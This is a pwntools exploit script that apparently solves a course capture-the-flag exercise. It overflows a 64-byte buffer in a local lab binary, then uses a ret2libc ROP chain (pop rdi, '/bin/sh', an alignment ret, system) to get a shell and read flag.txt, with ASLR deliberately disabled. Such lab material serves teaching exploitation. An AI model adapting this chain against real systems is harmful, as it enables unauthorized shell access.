from pwn import *

context.binary = elf = ELF('./ret2libc_vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# This service runs with ASLR disabled (see README) -- that keeps Hard 1
# focused purely on the ROP/ret2libc technique taught on Day 4, without
# also requiring a separate address leak (that's Hard 2).
p = process([elf.path], aslr=False)

p.recvuntil(b'Buffer: ')
p.recvline()   # leaked stack pointer (not needed here)
p.recvline()   # banner line

maps = open(f"/proc/{p.pid}/maps").read()
libc_base = None
for line in maps.splitlines():
    if 'libc.so.6' in line:
        libc_base = int(line.split('-')[0], 16)
        break
libc.address = libc_base
log.info(f"libc base: {hex(libc_base)}")

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]  # stack alignment fix for movaps in system()
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

offset = 64 + 8  # buf[64] + saved RBP
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret_gadget)  # 16-byte-align the stack before system()
payload += p64(system)

p.sendline(payload)
p.sendline(b'cat flag.txt')
print(p.recvall(timeout=2).decode(errors='replace'))
